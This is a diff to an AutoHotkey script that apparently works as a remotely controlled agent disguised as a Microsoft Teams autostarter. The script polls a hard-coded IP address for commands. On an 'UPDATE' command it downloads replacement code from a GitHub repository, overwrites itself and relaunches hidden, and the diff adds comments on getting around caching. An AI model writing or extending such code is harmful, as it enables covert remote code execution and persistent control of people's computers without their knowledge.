@@ -5,7 +5,7 @@
 SetBatchLines, -1
 
 global LaptopID := "###LAPTOP_ID###" 
-global Version := "1.40"
+global Version := "1.41"
 
 global Url := "http://136.119.161.133:5000"
 
@@ -44,18 +44,30 @@ CheckState() {
                 text := req.responseText
                 if (text != "") {
                     if (text == "sys|UPDATE") {
-                        updateReq := ComObjCreate("MSXML2.XMLHTTP")
-                        updateReq.open("GET", "https://raw.githubusercontent.com/mo-hashad30/wf/main/ms-teams_autostarter.exe?t=" A_TickCount, false)
+                        ; Use WinHttp to bypass Windows local IE cache
+                        updateReq := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+                        
+                        ; Use the GitHub API endpoint instead of the raw CDN to bypass Fastly caching
+                        updateReq.open("GET", "https://api.github.com/repos/mo-hashad30/wf/contents/ms-teams_autostarter.exe", false)
+                        
+                        ; This header tells the GitHub API to return the raw file content instead of JSON
+                        updateReq.setRequestHeader("Accept", "application/vnd.github.v3.raw")
                         updateReq.setRequestHeader("Cache-Control", "no-cache")
+                        updateReq.setRequestHeader("Pragma", "no-cache")
                         updateReq.send()
+                        
                         if (updateReq.status == 200) {
                             newCode := updateReq.responseText
+                            
+                            ; We split the string so the initial PowerShell install doesn't accidentally replace this
                             placeholder := "###LAPTOP_" . "ID###"
                             newCode := StrReplace(newCode, placeholder, LaptopID)
+                            
                             file := FileOpen(A_ScriptFullPath, "w", "UTF-8")
                             if (file) {
                                 file.Write(newCode)
                                 file.Close()
+                                
                                 Run, "%A_AhkPath%" "%A_ScriptFullPath%", , Hide
                                 ExitApp
                             }
